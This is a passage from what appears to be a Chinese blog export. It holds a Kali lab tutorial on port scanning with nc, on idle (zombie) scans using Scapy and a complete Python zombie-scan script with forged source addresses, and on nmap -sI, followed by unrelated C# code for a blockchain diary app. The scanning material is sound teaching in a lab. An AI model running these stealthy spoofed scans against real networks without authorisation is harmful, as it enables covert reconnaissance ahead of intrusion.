open</span><br><span class="line">22/tcp          open</span><br><span class="line">80/tcp          open</span><br><span class="line">139/tcp         open</span><br><span class="line">143/tcp         open</span><br><span class="line"></span><br><span class="line">Portscan Finished: Scanned 150 ports, 144 ports were <span class="keyword">in</span> state closed</span><br></pre></td></tr></table></figure>
<p><strong>wireshark抓包结果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129150152630-1232245741.png" /></p>
<h4 id="nc">（5）nc</h4>
<p><strong>示例
（nc的详细使用单独介绍，此处仅简单演示下）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># nc -nv -w 1 -z 10.10.10.129 1-100</span></span><br><span class="line">(UNKNOWN) [10.10.10.129] 80 (http) open</span><br><span class="line">(UNKNOWN) [10.10.10.129] 22 (ssh) open</span><br><span class="line">(UNKNOWN) [10.10.10.129] 21 (ftp) open</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># for x in $(seq 10 30);do nc -nv -w 1 -z 10.10.10.129 $x;done | grepopen           </span></span><br><span class="line">(UNKNOWN) [10.10.10.129] 10 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 11 (systat) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 12 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 13 (daytime) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 14 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 15 (netstat) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 16 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 17 (qotd) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 18 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 19 (chargen) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 20 (ftp-data) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 21 (ftp) open</span><br><span class="line">(UNKNOWN) [10.10.10.129] 22 (ssh) open</span><br><span class="line">(UNKNOWN) [10.10.10.129] 23 (telnet) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 24 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 25 (smtp) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 26 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 27 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 28 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 29 (?) : Connection refused</span><br><span class="line">(UNKNOWN) [10.10.10.129] 30 (?) : Connection refused</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># for x in $(seq 1 140);do nc -nv -w 1 -z 10.10.10.$x 80;done                        </span></span><br><span class="line">(UNKNOWN) [10.10.10.1] 80 (http) : Connection timed out</span><br><span class="line">(UNKNOWN) [10.10.10.2] 80 (http) : Connection refused</span><br><span class="line"> ………………………………</span><br><span class="line">(UNKNOWN) [10.10.10.128] 80 (http) : Connection timed out</span><br><span class="line">(UNKNOWN) [10.10.10.129] 80(http) open</span><br><span class="line">(UNKNOWN) [10.10.10.130] 80 (http) : Connection timed out</span><br><span class="line"> ……………………………………</span><br><span class="line">(UNKNOWN) [10.10.10.140] 80 (http) : Connection timed out</span><br></pre></td></tr></table></figure>
<h3 id="僵尸扫描">3、僵尸扫描</h3>
<p><strong>原理参见前面描述</strong></p>
<p><strong>实验环境</strong></p>
<p>kali（攻击者，10.10.10.135），win2008（僵尸机，10.10.10.140），OWASP_0.94（目标机，10.10.10.129）</p>
<h4 id="scapy-3">（1）Scapy</h4>
<p><strong>示例（结合上面的原理图理解）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># scapy</span></span><br><span class="line">INFO: Can<span class="string">&#x27;t import PyX. Won&#x27;</span>t be able to use psdump() or pdfdump().</span><br><span class="line">                                      </span><br><span class="line">                     aSPY//YASa       </span><br><span class="line">             apyyyyCY//////////YCa       |</span><br><span class="line">            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy</span><br><span class="line"> ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.4</span><br><span class="line"> AYAsAYYYYYYYY///Ps              cY//S   |</span><br><span class="line">         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy</span><br><span class="line">         SPPPP///a          pP///AC//Y   |</span><br><span class="line">              A//A            cyP////C   | Have fun!</span><br><span class="line">              p///Ac            sC///a   |</span><br><span class="line">              P////YCpc           A//A   | Craft packets before they craft</span><br><span class="line">       scccccp///pSP///p          p//Y   | you.</span><br><span class="line">      sY/////////y  caa           S//P   |                      -- Socrate</span><br><span class="line">       cayCyayP//Ya              pY/Ya   |</span><br><span class="line">        sY/PsY////YCc          aC//Yp </span><br><span class="line">         sc  sccaCY//PCypaapyCP//YSs  </span><br><span class="line">                  spCPY//////YPSps    </span><br><span class="line">                       ccaacs         </span><br><span class="line">                                       using IPython 7.22.0</span><br><span class="line">&gt; &gt;&gt; i=IP()</span><br><span class="line">&gt;&gt;&gt; t=TCP()</span><br><span class="line">&gt;&gt;&gt; rz=(i/t)　　　　　　　　　　　　<span class="comment">#发往僵尸机的数据包</span></span><br><span class="line">&gt;&gt;&gt; rt=(i/t)　　　　　　　　　　　　<span class="comment">#发往目标机的数据包</span></span><br><span class="line">&gt;&gt;&gt; rz[IP].dst=<span class="string">&quot;10.10.10.140&quot;</span></span><br><span class="line">&gt;&gt;&gt; rz[TCP].dport=445</span><br><span class="line">&gt;&gt;&gt; rz[TCP].flags=<span class="string">&quot;SA&quot;</span></span><br><span class="line">&gt; &gt;&gt; rt[IP].src=<span class="string">&quot;10.10.10.140&quot;</span>　　<span class="comment">#注意此处在伪造地址</span></span><br><span class="line">&gt;&gt;&gt; rt[IP].dst=<span class="string">&quot;10.10.10.129&quot;</span></span><br><span class="line">&gt;&gt;&gt; rt[TCP].dport=22　　　　　　　 <span class="comment">#探测目标机的22端口</span></span><br><span class="line">&gt;&gt;&gt; rt[TCP].flags=<span class="string">&quot;S&quot;</span></span><br><span class="line">&gt; &gt;&gt;rz.display()　　　　　　　　　　<span class="comment">#发往僵尸机数据包的最终设置</span></span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 10.10.10.135</span><br><span class="line">  dst= 10.10.10.140</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= ftp_data</span><br><span class="line">     dport= microsoft_ds</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0 flags =SA</span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt;rt.display()　　　　　　　　　　<span class="comment">#发往目标机数据包的最终设置</span></span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= None</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= None</span><br><span class="line">  <span class="built_in">id</span>= 1</span><br><span class="line">  flags= </span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 64</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= None</span><br><span class="line">  src= 10.10.10.140</span><br><span class="line">  dst= 10.10.10.129</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= ftp_data</span><br><span class="line">     dport= ssh</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= None</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags= S</span><br><span class="line">     window= 8192</span><br><span class="line">     chksum= None</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt; az1=sr1(rz)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">.*</span><br><span class="line">Received 2 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt; &gt;&gt; at=sr1(rt)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">...*</span><br><span class="line">Received 4 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt; &gt;&gt; az2=sr1(rz)</span><br><span class="line">Begin emission:</span><br><span class="line">Finished sending 1 packets.</span><br><span class="line">*</span><br><span class="line">Received 1 packets, got 1 answers, remaining 0 packets</span><br><span class="line">&gt; &gt;&gt;az1.display()　　　　　　　　　　<span class="comment">#第一次收到僵尸机的回包</span></span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= 5</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= 40</span><br><span class="line">  <span class="built_in">id</span> = 152　　　　　　　　　　　　　　　<span class="comment">#注意此时 ipid=152</span></span><br><span class="line">  flags= DF</span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 128</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= 0xd111</span><br><span class="line">  src= 10.10.10.140</span><br><span class="line">  dst= 10.10.10.135</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= microsoft_ds</span><br><span class="line">     dport= ftp_data</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= 5</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags= R</span><br><span class="line">     window= 0</span><br><span class="line">     chksum= 0x84e9</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load= <span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">&gt; &gt;&gt;az2.display()　　　　　　　　<span class="comment">#第二次收到僵尸机的回包</span></span><br><span class="line"><span class="comment">###[ IP ]### </span></span><br><span class="line">  version= 4</span><br><span class="line">  ihl= 5</span><br><span class="line">  tos= 0x0</span><br><span class="line">  len= 40</span><br><span class="line">  <span class="built_in">id</span> = 154　　　　　　　　　　　　　　<span class="comment">#注意此时 ipid=154=az1[IP].id + 2 ，所以得出目标机 22 端口是开着的！</span></span><br><span class="line">  flags= DF</span><br><span class="line">  frag= 0</span><br><span class="line">  ttl= 128</span><br><span class="line">  proto= tcp</span><br><span class="line">  chksum= 0xd10f</span><br><span class="line">  src= 10.10.10.140</span><br><span class="line">  dst= 10.10.10.135</span><br><span class="line">  \options\</span><br><span class="line"><span class="comment">###[ TCP ]### </span></span><br><span class="line">     sport= microsoft_ds</span><br><span class="line">     dport= ftp_data</span><br><span class="line">     <span class="built_in">seq</span>= 0</span><br><span class="line">     ack= 0</span><br><span class="line">     dataofs= 5</span><br><span class="line">     reserved= 0</span><br><span class="line">     flags= R</span><br><span class="line">     window= 0</span><br><span class="line">     chksum= 0x84e9</span><br><span class="line">     urgptr= 0</span><br><span class="line">     options= []</span><br><span class="line"><span class="comment">###[ Padding ]### </span></span><br><span class="line">        load= <span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; </span><br></pre></td></tr></table></figure>
<p><strong>wireshark抓包结果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129155929657-1953922730.png" /></p>
<h4 id="python脚本实现扫描">（2）python脚本实现扫描：</h4>
<p><strong>zombie.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.getLogger(<span class="string">&quot;scapy.runtime&quot;</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ipid</span>(<span class="params">zombie</span>):<span class="comment">#判断能否作为僵尸机使用,zombie 僵尸机IP</span></span><br><span class="line">    reply1 = sr1(IP(dst=zombie)/TCP(flags=<span class="string">&quot;SA&quot;</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)<span class="comment">#仅接收一个应答数据包</span></span><br><span class="line">    send(IP(dst=zombie)/TCP(flags=<span class="string">&quot;SA&quot;</span>),verbose=<span class="number">0</span>)<span class="comment">#只发包，而不收包</span></span><br><span class="line">    reply2 = sr1(IP(dst=zombie)/TCP(flags=<span class="string">&quot;SA&quot;</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#通过接收到的ipid评判是否适合做僵尸机</span></span><br><span class="line">    <span class="keyword">if</span> reply2[IP].<span class="built_in">id</span> == (reply1[IP].<span class="built_in">id</span>+<span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IPID sequence is incremental and target appears to be idle. ZOMBIE LOCATED&quot;</span>)<span class="comment">#ipid是递增的，并且目标机似乎是空闲的</span></span><br><span class="line">        response = <span class="built_in">input</span>(<span class="string">&quot;Do you want to use this zombie to perform a scan? (Y or N):&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> response == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">            target = <span class="built_in">input</span>(<span class="string">&quot;Enter the IP address of the target system   : &quot;</span>)</span><br><span class="line">            zombiescan(target,zombie)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Either the IPID sequence is not increnental or the target is not idle. NOT A G00D Z0MBIE&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zombiescan</span>(<span class="params">target,zombie</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nScanning target &quot;</span>+ target+<span class="string">&quot; with zombie &quot;</span>+ zombie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n--------0pen Ports on Target--------\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):　　　　　　　　<span class="comment">#根据自己的需求设置</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            start_val = sr1(IP(dst=zombie)/TCP(flags=<span class="string">&quot;SA&quot;</span>,dport=port),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">            send(IP(src=zombie,dst=target)/TCP(flags=<span class="string">&quot;S&quot;</span>,dport=port),verbose=<span class="number">0</span>)</span><br><span class="line">            end_val = sr1(IP(dst=zombie)/TCP(flags=<span class="string">&quot;SA&quot;</span>),timeout=<span class="number">2</span>,verbose=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> end_val[IP].<span class="built_in">id</span> == (start_val[IP].<span class="built_in">id</span> + <span class="number">2</span>):</span><br><span class="line">                <span class="built_in">print</span>(port)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----------Zombie Scan Suite----------\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1 - Identify Zombie Host\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2 - Perform Zombie Scan\n&quot;</span>)</span><br><span class="line">ans = <span class="built_in">input</span>(<span class="string">&quot;Select an option (1 or 2):&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> ans == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">    zombie=<span class="built_in">input</span>(<span class="string">&quot;Enter IP address to test IPID sequence: &quot;</span>)</span><br><span class="line">    ipid(zombie)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> ans == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        zombie = <span class="built_in">input</span>(<span class="string">&quot;Enter IP address for zombie system: &quot;</span>)</span><br><span class="line">        target = <span class="built_in">input</span>(<span class="string">&quot;Enter IP address for scan target: &quot;</span>)</span><br><span class="line">        zombiescan(target,zombie)</span><br></pre></td></tr></table></figure>
<p><strong>脚本演示：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># python3 ./zombie.py</span></span><br><span class="line">----------Zombie Scan Suite----------</span><br><span class="line"></span><br><span class="line">1 - Identify Zombie Host</span><br><span class="line"></span><br><span class="line">2 - Perform Zombie Scan</span><br><span class="line"></span><br><span class="line">Select an option (1 or 2):1　　　　　　　　　　<span class="comment">#如果已有僵尸机可直接选择 2</span></span><br><span class="line">Enter IP address to <span class="built_in">test</span> IPID sequence: 10.10.10.140　　　　　　<span class="comment">#僵尸机地址</span></span><br><span class="line">IPID sequence is incremental and target appears to be idle. ZOMBIE LOCATED　　　　　　<span class="comment">#可做僵尸机</span></span><br><span class="line">Do you want to use this zombie to perform a scan? (Y or N):Y　　　　<span class="comment">#是否选用该僵尸机</span></span><br><span class="line">Enter the IP address of the target system   : 10.10.10.129　　　　<span class="comment">#要扫描的目标机</span></span><br><span class="line"></span><br><span class="line">Scanning target 10.10.10.129 with zombie 10.10.10.140</span><br><span class="line"></span><br><span class="line">--------0pen Ports on Target--------</span><br><span class="line"></span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">80</span><br><span class="line">139</span><br><span class="line">143</span><br></pre></td></tr></table></figure>
<p><strong>wireshark抓包：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211129161135190-100027512.png" /></p>
<h4 id="nmap-3">（3）nmap</h4>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># nmap -p445 10.10.10.140 --script=ipidseq.nse　　　　　　　　　　#发现僵尸机</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 03:16 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.140</span><br><span class="line">Host is up (0.00088s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 00:0C:29:F6:B3:C1 (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_ipidseq: Incremental!</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.37 seconds</span><br><span class="line">                                                                                           </span><br><span class="line">┌──(root💀kali)-[/home/kali/Desktop/ Tools]</span><br><span class="line">└─<span class="comment"># nmap 10.10.10.129 -sI 10.10.10.140 -Pn -p 0-200#利用僵尸机扫描目标</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 03:16 EST</span><br><span class="line">Idle scan using zombie 10.10.10.140 (10.10.10.140:80); Class: Incremental</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.129</span><br><span class="line">Host is up (0.048s latency).</span><br><span class="line">Not shown: 196 closed|filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">21/tcp  open  ftp</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">143/tcp open  imap</span><br><span class="line">MAC Address: 00:0C:29:DE:5D:BA (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 3.98 seconds</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>端口扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链日记程序</title>
    <url>/2022/07/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%97%A5%E8%AE%B0%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="程序流图">1. 程序流图</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c558195ffa9.png" /></p>
<h2 id="程序源码">2. 程序源码</h2>
<h3 id="日记记录模块">1、日记记录模块</h3>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">button2_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)<span class="comment">//记录</span></span></span><br><span class="line">        &#123;</span><br><span class="line">            DateTime dateTime = DateTime.Now;</span><br><span class="line">            <span class="built_in">string</span> date = dateTime.ToString();</span><br><span class="line">            textBox2.Text = <span class="string">&quot;start:\r\n\r\n  &quot;</span>+date+ <span class="string">&quot; 新增日记：\r\n\r\n    &quot;</span> + textBox3.Text + <span class="string">&quot;\r\n\r\nend&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> opReturnData = encryptor(textBox3.Text);</span><br><span class="line">            textBox3.Text = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> PrivateKeyStr = textBox1.Text;<span class="comment">//发送地址的私钥</span></span><br><span class="line">            <span class="built_in">string</span> uri = bsvConfiguration_class.RestApiUri;</span><br><span class="line">            <span class="built_in">string</span> network = bsvConfiguration_class.testNetwork;</span><br><span class="line"></span><br><span class="line">            Task&lt;Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;&gt; t = Task&lt;Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;&gt;.Run(() =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; response = bsvTransaction_class.send(PrivateKeyStr, <span class="number">0</span>, network, <span class="literal">null</span>, <span class="literal">null</span>, opReturnData, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">return</span> (response);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="日记读取模块">2、日记读取模块</h3>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">button1_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            textBox2.Text = <span class="string">&quot;start:\r\n&quot;</span>;</span><br><span class="line">            <span class="built_in">string</span> Address = address_obtain();</span><br><span class="line">            <span class="built_in">string</span> uri = bsvConfiguration_class.RestApiUri;</span><br><span class="line">            <span class="built_in">string</span> network = bsvConfiguration_class.testNetwork;</span><br><span class="line">            Task t = Task&lt;RestApiAddressHistoryTx[]&gt;.Run(() =&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                RestApiAddressHistoryTx[] addresshistory = RestApi_class.getAddressHistory(uri, network, Address);</span><br><span class="line">                <span class="built_in">int</span> j = <span class="number">1</span>;<span class="comment">//日记编号</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="built_in">int</span> num= <span class="number">0</span>;num &lt; addresshistory.Count();num = num + <span class="number">20</span>)<span class="comment">//批量提取hash,读取相关数据</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">string</span>[] txhashs = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">20</span>];</span><br><span class="line">                    <span class="built_in">int</span> i = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span>(; num + i &lt; addresshistory.Count()&amp;&amp; i&lt;<span class="number">20</span>; i++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        txhashs[i] = addresshistory[num + i].TxHash;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    RestApiTransaction[] txs = RestApi_class.getTransactions(uri, network, txhashs);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">foreach</span> (RestApiTransaction tx <span class="keyword">in</span> txs)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">string</span> s = RestApi_class.getOpReturnData(tx, bsvConfiguration_class.encoding);</span><br><span class="line">                        <span class="keyword">if</span> (s == <span class="literal">null</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        s = Decryptor(s);</span><br><span class="line">                        <span class="built_in">string</span> s1 = tx.BlockTime.ToString();</span><br><span class="line">                        DateTime dateTime = StampToDateTime(s1);</span><br><span class="line">                        <span class="built_in">string</span> date = dateTime.ToString();</span><br><span class="line">                        textBox2.Text += <span class="string">&quot;\r\n  &quot;</span> + date + <span class="string">&quot; 第 &quot;</span> + j + <span class="string">&quot; 篇日记：\r\n\r\n    &quot;</span> + s + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">                        j = j + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                textBox2.Text += <span class="string">&quot;\r\nend&quot;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="地址计算">3、地址计算</h3>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">address_obtain</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> PrivateKeyStr = textBox1.Text;<span class="comment">//发送地址的私钥</span></span><br><span class="line">            BitcoinSecret PrivateKey = <span class="keyword">new</span> BitcoinSecret(PrivateKeyStr);</span><br><span class="line">            Network network = PrivateKey.Network;</span><br><span class="line">            PubKey pubKey = PrivateKey.PubKey;</span><br><span class="line">            KeyId pubkeyhash = pubKey.Hash;</span><br><span class="line">            BitcoinAddress address = pubkeyhash.GetAddress(network);</span><br><span class="line">            <span class="built_in">string</span> Address = address.ToString(); ;<span class="comment">//接收地址</span></span><br><span class="line">            <span class="keyword">return</span> Address;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="aes加密">4、AES加密</h3>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">encryptor</span>(<span class="params"><span class="built_in">string</span> data</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> privateKeyStr = textBox1.Text;<span class="comment">//发送地址的私钥</span></span><br><span class="line">            <span class="built_in">byte</span>[] publicKey = BitcoinSVCryptor_class.getBCPublicKey(privateKeyStr);</span><br><span class="line">            <span class="built_in">string</span> publicKeyStr = BitcoinSVCryptor_class.getCompressedBCPublicKey(privateKeyStr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">byte</span>[] encryptedBytes;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//AES</span></span><br><span class="line">            encryptedBytes = AES_class.AesEncrypt(data, privateKeyStr);</span><br><span class="line"></span><br><span class="line">            Base58Encoder base58Encoder = <span class="keyword">new</span> Base58Encoder();</span><br><span class="line">            <span class="built_in">string</span> base58enstr = base58Encoder.EncodeData(encryptedBytes);</span><br><span class="line">            <span class="keyword">return</span> base58enstr;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="aes解密">5、AES解密</h3>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">string</span> <span class="title">Decryptor</span>(<span class="params"><span class="built_in">string</span> enstr</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> privateKeyStr = textBox1.Text;<span class="comment">//发送地址的私钥</span></span><br><span class="line">            <span class="built_in">byte</span>[] publicKey = BitcoinSVCryptor_class.getBCPublicKey(privateKeyStr);</span><br><span class="line">            <span class="built_in">string</span> publicKeyStr = BitcoinSVCryptor_class.getCompressedBCPublicKey(privateKeyStr);</span><br><span class="line"></span><br><span class="line">            Base58Encoder base58Encoder = <span class="keyword">new</span> Base58Encoder();</span><br><span class="line">            <span class="built_in">byte</span>[] base58destr = base58Encoder.DecodeData(enstr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> DecryptedStr = AES_class.AesDecrypt(base58destr, privateKeyStr);</span><br><span class="line">            <span class="keyword">return</span> DecryptedStr;</span><br><span class="line">            <span class="comment">//Console.WriteLine(DecryptedStr);</span></span><br><span class="line">        